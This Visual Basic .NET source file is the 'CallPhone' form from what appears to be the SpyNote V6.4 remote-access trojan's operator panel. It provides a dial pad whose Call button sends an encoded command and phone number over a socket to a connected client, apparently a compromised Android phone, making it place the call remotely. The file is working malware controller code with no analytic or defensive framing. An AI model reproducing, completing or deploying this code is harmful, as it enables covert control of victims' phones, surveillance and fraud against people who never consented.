Imports Microsoft.VisualBasic.CompilerServices
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class CallPhone
    Public TClient As SocketClient
    Private Sub Btn0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn0.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "0")
    End Sub

    Private Sub Btn1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn1.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "1")
    End Sub

    Private Sub Btn2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn2.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "2")
    End Sub

    Private Sub Btn3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn3.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "3")
    End Sub

    Private Sub Btn4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn4.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "4")
    End Sub

    Private Sub Btn5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn5.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "5")
    End Sub

    Private Sub Btn6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn6.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "6")
    End Sub

    Private Sub Btn7_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn7.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "7")
    End Sub

    Private Sub Btn8_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn8.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "8")
    End Sub

    Private Sub Btn9_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Btn9.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "9")
    End Sub

    Private Sub BtnA_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnA.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "*")
    End Sub

    Private Sub BtnB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnB.Click
        Dim tEXTNUM As TextBox = Me.TEXTNUM
        tEXTNUM.Text = String.Concat(tEXTNUM.Text, "#")
    End Sub

    Private Sub BtnCall_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnCall.Click
        Dim flag As Boolean = Me.TClient IsNot Nothing
        If flag Then
            Dim flag2 As Boolean = Me.TEXTNUM.Text.Length > 0
            If flag2 Then
                Me.TClient.Send(Store.BFF(Store.buff, 32L) + SN.Data.SplitData + Me.TEXTNUM.Text.Trim())
            End If
        End If
        MyBase.Close()
    End Sub
    Private Sub btnREMOVE_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnREMOVE.Click
        If (Me.TEXTNUM.Text.Length > 0) Then
            Me.TEXTNUM.Text = Me.TEXTNUM.Text.Remove(Me.TEXTNUM.Text.Length - 1)
        End If
    End Sub

    Private Sub btnREMOVE_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles btnREMOVE.MouseDown
        Me.Timer1.Enabled = True
    End Sub

    Private Sub btnREMOVE_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles btnREMOVE.MouseUp
        Me.Timer1.Enabled = False
    End Sub

    Private Sub CallPhone_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\6.ico"))
        Me.TEXTNUM.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.Btn1.ImageChoice = Store.Bitmap_0("Phone\1")
        Me.Btn1.ShowImage = True
        Me.Btn2.ImageChoice = Store.Bitmap_0("Phone\2")
        Me.Btn2.ShowImage = True
        Me.Btn3.ImageChoice = Store.Bitmap_0("Phone\3")
        Me.Btn3.ShowImage = True
        Me.Btn4.ImageChoice = Store.Bitmap_0("Phone\4")
        Me.Btn4.ShowImage = True
        Me.Btn5.ImageChoice = Store.Bitmap_0("Phone\5")
        Me.Btn5.ShowImage = True
        Me.Btn6.ImageChoice = Store.Bitmap_0("Phone\6")
        Me.Btn6.ShowImage = True
        Me.Btn7.ImageChoice = Store.Bitmap_0("Phone\7")
        Me.Btn7.ShowImage = True
        Me.Btn8.ImageChoice = Store.Bitmap_0("Phone\8")
        Me.Btn8.ShowImage = True
        Me.Btn9.ImageChoice = Store.Bitmap_0("Phone\9")
        Me.Btn9.ShowImage = True
        Me.BtnA.ImageChoice = Store.Bitmap_0("Phone\b")
        Me.BtnA.ShowImage = True
        Me.Btn0.ImageChoice = Store.Bitmap_0("Phone\0")
        Me.Btn0.ShowImage = True
        Me.BtnB.ImageChoice = Store.Bitmap_0("Phone\a")
        Me.BtnB.ShowImage = True
        Me.btnREMOVE.ImageChoice = Store.Bitmap_0("Phone\rem")
        Me.btnREMOVE.ShowImage = True
        Me.BtnCall.ImageChoice = Store.Bitmap_0("Phone\c")
        Me.BtnCall.ShowImage = True
        Me.TProgressBar.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub
    Public Sub TData(Ay As Array)
        Try
            Dim left As String = CStr(Ay.GetValue(0))
            Dim flag As Boolean = Operators.CompareString(left, Store.BFF(Store.buff, 83L), False) = 0
            If Not flag Then
                flag = (Operators.CompareString(left, Store.BFF(Store.buff, 84L), False) = 0)
                If flag Then
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        Me.TEXTNUM.Text = ""
        Me.Timer1.Enabled = False
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(32)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
End Class